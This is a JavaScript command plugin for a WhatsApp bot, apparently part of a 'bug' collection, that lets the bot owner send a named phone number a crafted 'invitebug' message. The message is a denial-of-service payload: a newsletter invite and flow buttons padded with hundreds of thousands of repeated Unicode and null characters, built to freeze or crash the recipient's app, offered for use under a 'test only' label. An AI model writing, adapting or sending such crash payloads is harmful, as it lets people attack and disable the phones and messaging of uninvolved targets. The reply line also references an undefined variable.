const { cmd } = require("../command");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const { sleep } = require("../lib/functions");

cmd({
  pattern: "invitebug",
  use: ".invitebug <number>",
  category: "bug",
  desc: "Send invite Bug (test only)",
  filename: __filename
}, async(conn, mek, m,{from, l, quoted, body, isCmd, umarmd, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
if (!isCreator) return reply("You're not bot owner 🪄.");

  if (!args[0]) return reply("⚠️ Use: .invitebug 923xxxxxxx");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await VampireBugIns(conn, target); 


  await reply(`*Process Bug Sending To @${targetNumber} ⏳*

*⚠️ Note :* Use The Command Again After 3 Minutes Because The Bug Process Sending*

> Powered By JawadTechX 💸`);

});


async function VampireBugIns(conn, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎" + "ꦾ".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              "screen_2_OptIn_0": true,
              "screen_2_OptIn_1": true,
              "screen_1_Dropdown_0": "nullOnTop",
              "screen_1_DatePicker_1": "1028995200000",
              "screen_1_TextInput_2": "null@gmail.com",
              "screen_1_TextInput_3": "94643116",
              "screen_0_TextInput_0": "\u0000".repeat(500000),
              "screen_0_TextInput_1": "SecretDocu",
              "screen_0_Dropdown_2": "#926-Xnull",
              "screen_0_RadioButtonsGroup_3": "0_true",
              "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "Vampire",
          },
        ],
      },
    };

    await conn.relayMessage(target, message, {
      userJid: target,
    });
  } catch (err) {
    console.error("❌ Error sending vampire bug:", err);
  }
}
